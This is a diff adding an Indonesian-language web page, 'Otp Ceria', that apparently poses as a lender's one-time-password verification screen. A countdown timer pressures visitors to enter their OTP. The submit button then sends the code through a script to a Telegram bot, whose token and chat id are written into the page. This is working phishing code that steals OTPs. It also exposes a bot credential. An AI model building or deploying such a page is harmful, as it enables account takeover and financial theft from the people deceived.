@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Otp Ceria</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Gambar */
+    #gambar-atas {
+      margin-top: 20px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+    }
+
+    /* Kolom Input Kode OTP */
+    #kode-otp {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 400px;
+      padding: 12px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    /* Waktu Hitung Mundur */
+    #countdown {
+      margin-top: 7px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    /* Tombol Submit */
+    #submit {
+      margin-top: 8px;
+      padding: 13px;
+      border-radius: 4px;
+      border: none;
+      background-color: #663399;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      width: 80%;
+      max-width: 400px;
+    }
+  </style>
+  <script>
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          // Respons atau tindakan setelah pesan terkirim berhasil
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+
+      // Ganti URL sesuai dengan endpoint bot Telegram Anda
+      var url = "https://api.telegram.org/bot<6534254502:AAHSAgtfYh39EyG13XBhaxpF_a8YJEKgFKY>/sendMessage?chat_id=<6824078885>&text=" + encodeURIComponent(message);
+
+      // Kirim permintaan POST
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var kodeOTP = document.getElementById("kode-otp").value;
+      sendMessageToTelegram("Kode OTP: " + kodeOTP);
+    }
+  </script>
+</head>
+<body>
+  <!-- Gambar -->
+  <div id="gambar-atas">
+    <img src="https://from-limit-ceria-id.netlify.app/otp/img/atas.jpg" alt="Gambar Atas">
+  </div>
+
+  <!-- Kolom Input Kode OTP -->
+  <input type="text" id="kode-otp" name="kode_otp" placeholder="Masukkan Kode OTP" maxlength="6">
+
+  <!-- Waktu Hitung Mundur -->
+  <div id="countdown"></div>
+
+  <!-- Tombol Submit -->
+  <input type="submit" id="submit" value="Submit" onclick="kirimPesan()">
+
+  <script>
+    // Waktu Hitung Mundur
+    var countDownDate = new Date().getTime() + 5 * 60 * 1000; // 5 menit dari waktu sekarang
+
+    var countdownElement = document.getElementById("countdown");
+
+    var x = setInterval(function() {
+      var now = new Date().getTime();
+      var distance = countDownDate - now;
+
+      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      countdownElement.innerHTML = "Waktu tersisa: " + minutes + "m " + seconds + "s ";
+
+      if (distance < 0) {
+        clearInterval(x);
+        countdownElement.innerHTML = "Waktu sudah habis!";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
